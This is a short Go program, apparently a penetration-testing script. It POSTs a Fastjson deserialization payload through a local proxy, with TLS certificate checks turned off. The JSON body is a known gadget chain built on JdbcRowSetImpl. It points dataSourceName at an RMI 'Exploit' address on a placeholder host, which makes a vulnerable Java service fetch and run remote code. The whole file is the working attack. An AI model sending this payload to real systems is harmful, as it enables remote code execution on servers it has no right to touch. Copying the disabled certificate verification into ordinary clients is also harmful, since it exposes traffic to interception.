package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"
)

var proxyUrl, _ = url.Parse("http://127.0.0.1:8080")

var transport = &http.Transport{
	Proxy: http.ProxyURL(proxyUrl), //设置代理发送请求
	TLSClientConfig: &tls.Config{
		InsecureSkipVerify: true, //通过设置Transport的TLSClientConfig来忽略证书验证:
	},
}

var client = http.Client{
	Timeout:   time.Second * 10,
	Transport: transport,
}

type RequestStruct struct {
	Name string `json:"name"`
	Age  int    `json:"age"`
}

func main() {
	ip_ := "https://api.example.com/submit" // Replace with the actual API endpoint

	// // 构造请求数据
	// reqBody := RequestStruct{
	// 	Name: "John",
	// 	Age:  30,
	// }

	// // 生成JSON
	// jsonReq, err := json.Marshal(reqBody)

	jsonData := `
	{
		"a":{
			"@type":"java.lang.Class",
			"val":"com.sun.rowset.JdbcRowSetImpl"
		},
		"b":{
			"@type":"com.sun.rowset.JdbcRowSetImpl",
			"dataSourceName":"rmi://%s:9999/Exploit",
			"autoCommit":true
		}
	}
	`
	jsonData = fmt.Sprintf(strings.Replace(jsonData, "%s", "world", -1)) //替换次数n是-1,表示全部替换

	// jsonData = fmt.Printf(jsonData, "world")

	body := bytes.NewBuffer([]byte(jsonData))

	// Create the HTTP request
	// request, err := http.NewRequest("POST", ip_, bytes.NewBuffer(jsonReq))
	request, err := http.NewRequest("POST", ip_, body)

	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	// Set the content type header
	request.Header.Set("Content-Type", "application/json")
	request.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")

	// Send the request
	response, err := client.Do(request)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}
	defer response.Body.Close()

	// Process the response...
	fmt.Println("Response status:", response.Status)
	// Read the response body, etc.
}
